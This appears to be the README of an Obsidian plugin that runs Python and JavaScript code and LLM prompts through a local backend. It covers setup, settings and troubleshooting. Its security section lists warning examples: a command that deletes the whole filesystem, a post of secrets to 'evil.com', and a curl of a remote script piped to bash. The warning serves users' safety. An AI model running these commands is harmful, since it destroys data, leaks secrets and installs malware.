# Code Runner for Obsidian

**Execute Python & JavaScript with full package access + ChatGPT integration.** 

Unlike sandboxed solutions, Code Runner uses a **real Python kernel** with persistent sessions and unlimited package support.

![Version](https://img.shields.io/badge/version-1.0.0-blue)
![License](https://img.shields.io/badge/license-MIT-green)

**What makes this different:**
- âœ… **Full Python** - Use pandas, scikit-learn, ANY package
- ğŸ§  **True Kernel** - Variables persist like Jupyter
- ğŸ¤– **ChatGPT/Claude** - LLM blocks for AI-assisted workflows  
- ğŸ”’ **100% Local** - Code never leaves your machine
- âš¡ **Fast** - Direct execution, no sandboxing overhead

**Perfect for:** Data scientists, ML engineers, researchers who need real Python power in their notes.

---

## âœ¨ Features

**Core Execution:**
- ğŸ **Python & JavaScript** - Run code blocks with a click or hotkey
- ğŸ§  **Kernel Mode** - Variables persist across blocks (like Jupyter)
- âš¡ **Editor Mode** - Execute with `Cmd/Ctrl+Shift+Enter`
- ğŸ“Š **Inline Output** - Results appear directly in your notes
- ğŸ’¾ **Output Blocks** - Saved as markdown for version control

**AI Integration:**
- ğŸ¤– **ChatGPT/Claude/Ollama** - Run LLM prompts as code blocks
- ğŸ”§ **Agent Mode** - Task-oriented AI responses
- ğŸ” **Secure** - Use your own API keys (stored locally)

**Developer Experience:**
- âš™ï¸ **Full Settings UI** - Configure everything in Obsidian
- ğŸ“œ **Error Handling** - Clear error messages
- ğŸ¨ **Themed** - Matches your Obsidian theme

---

## ğŸš€ Quick Start

### 1. Install Plugin

**Manual Installation:**
1. Download `release.zip` from [Releases](https://github.com/yourusername/obsidian-code-runner/releases)
2. Extract to `.obsidian/plugins/obsidian-code-runner/`
3. Enable in Settings â†’ Community Plugins

### 2. Start Backend

```bash
cd obsidian-code-runner/runner
pip install -r requirements.txt
python -m uvicorn main:app --host 127.0.0.1 --port 8000 --reload
```

**One-time setup. Leave it running.** Backend only accessible from your machine.

### 3. Run Code!

**In Obsidian, create a code block:**

````markdown
```python
print("Hello from Obsidian!")
```
````

**Press `Cmd/Ctrl+Shift+Enter` or switch to Reading View and click `â–¶ Run`**

**Output appears:**
````markdown
```output
Hello from Obsidian!
```
````

**Done!** ğŸ‰

---

## ğŸ“– Usage Examples

### Python with Persistent Variables

````markdown
```python
x = 42
y = 10
```

```python
print(x + y)  # Variables persist!
```

```output
52
```
````

### ChatGPT Integration

````markdown
```llm
Explain quantum entanglement in one sentence
```
````

**Configure in Settings â†’ LLM Configuration**

---

## âš™ï¸ Settings

**Settings â†’ Community Plugins â†’ Code Runner**

| Setting | Description | Default |
|---------|-------------|---------|
| **Backend URL** | Where code executes | `http://127.0.0.1:8000/run` |
| **Kernel Mode** | Persistent Python sessions | âœ… ON |
| **Enable Python** | Python execution | âœ… ON |
| **Enable JavaScript** | JavaScript execution | âœ… ON |
| **Enable LLM** | AI prompt blocks | âŒ OFF |

**LLM Configuration (when enabled):**
- **Provider**: Auto / Ollama / OpenAI
- **API Key**: Your OpenAI key
- **Model**: Which AI model to use

---

## ğŸ¤– AI Features Setup

### Option 1: Ollama (Local, Free, Private)

```bash
# Install Ollama
# Download from https://ollama.ai

# Pull a model
ollama pull llama2

# Run Ollama
ollama serve
```

**No API key needed!**

### Option 2: OpenAI (Cloud, Paid)

1. Get API key: [platform.openai.com/api-keys](https://platform.openai.com/api-keys)
2. Settings â†’ Code Runner â†’ LLM Configuration
3. Paste API key
4. Done!

---

## ğŸ¯ How It Works

```
Your Note (Obsidian)
    â†“
Plugin sends code
    â†“
FastAPI Backend (local)
    â†“
Executes Python/JS
    â†“
Returns output
    â†“
Displayed in note
```

**Backend runs locally = your code never leaves your machine.**

---

## ğŸ”§ Backend Details

**What it does:**
- Executes Python/JavaScript code
- Manages kernel sessions
- Calls LLM APIs

**Requirements:**
- Python 3.8+
- FastAPI, Uvicorn

**Start command:**
```bash
python -m uvicorn main:app --host 127.0.0.1 --port 8000 --reload
```

**Keep it running in the background.**

âš ï¸ **Security:** `127.0.0.1` means localhost only - backend not accessible from network.

---

## âŒ¨ï¸ Keyboard Shortcuts

| Action | Shortcut |
|--------|----------|
| Run current code block | `Cmd/Ctrl + Shift + Enter` |

---

## ğŸ”’ Security

### âš ï¸ Important: Code Execution Risks

**Code Runner executes code with YOUR user permissions.**

**What this means:**
- âœ… Code runs locally (not on cloud servers)
- âœ… Backend only accessible from your machine (`127.0.0.1`)
- âš ï¸ Code can access your files
- âš ï¸ Code can make network requests
- âš ï¸ Code can install packages

**This is the same risk as:**
- Running Python in your terminal
- Using Jupyter Notebook
- Executing code in VS Code

### Best Practices

âœ… **DO:**
- Review code before running
- Only run code you trust
- Use dedicated Python environment (venv)
- Keep backend on `127.0.0.1` (localhost only)

âŒ **DON'T:**
- Run untrusted code from internet
- Share your backend URL
- Port-forward backend to internet
- Run backend as root/admin

### Malicious Code Examples

**Don't run code like this:**
```python
# Deletes files
import os
os.system("rm -rf /")

# Exfiltrates data
import requests
requests.post("evil.com", data=open("secrets.txt"))

# Installs malware
import subprocess
subprocess.run(["curl", "evil.com/malware.sh", "|", "bash"])
```

**If you see suspicious patterns (`os.system`, `subprocess`, network requests to unknown URLs), DON'T RUN IT.**

### Future Security Features

**v1.1:**
- Dangerous code detection
- Confirmation prompts for risky operations

**v2.0:**
- Docker container execution
- File system restrictions
- Network isolation

---

## ğŸ› Troubleshooting

### "Error contacting backend"

**Solution:**
```bash
# Check if backend is running
curl http://localhost:8000/health

# If not, start it
cd runner
python -m uvicorn main:app --port 8000 --reload
```

### "Module not found"

**Solution:**
```bash
# Install requirements
cd runner
pip install -r requirements.txt
```

### LLM not working

**Solution:**
1. Enable in Settings â†’ Code Runner â†’ Enable LLM
2. Choose provider (Ollama or OpenAI)
3. Configure API key or start Ollama

---

## ğŸ“ Supported Languages

- âœ… **Python** (with kernel mode)
- âœ… **JavaScript** (Node.js)
- âœ… **LLM** (ChatGPT, Claude, Ollama)
- âœ… **Agent** (Task-oriented AI)

**Coming Soon:**
- Ruby, Go, Rust, SQL, Shell

---

## ğŸš§ Roadmap

**v1.1 (Next):**
- Clear output button
- Improved error display
- Example notebooks

**v1.2:**
- Matplotlib plots inline
- Pandas DataFrame tables
- Export to Jupyter

**v2.0:**
- Multi-language support
- Rich output (images, HTML)
- Notebook templates

---

## ğŸ’ Support

If Code Runner saves you time, consider:

- â˜• **[Buy me a coffee](https://ko-fi.com/nathandavies)**
- â­ **[Star this repo](https://github.com/yourusername/obsidian-code-runner)**
- ğŸ› **Report bugs** via Issues
- ğŸ’¡ **Suggest features**

---

## ğŸ“„ License

MIT License - see [LICENSE](LICENSE)

**Free forever. Open source. No tracking.**

---

## ğŸ™ Acknowledgments

Built with:
- [Obsidian API](https://docs.obsidian.md/)
- [FastAPI](https://fastapi.tiangolo.com/)
- Love for computational notebooks â¤ï¸

---

## ğŸ“« Contact

- GitHub: [@yourusername](https://github.com/yourusername)
- Issues: [Report a bug](https://github.com/yourusername/obsidian-code-runner/issues)

---

**Made with â¤ï¸ for the Obsidian community**
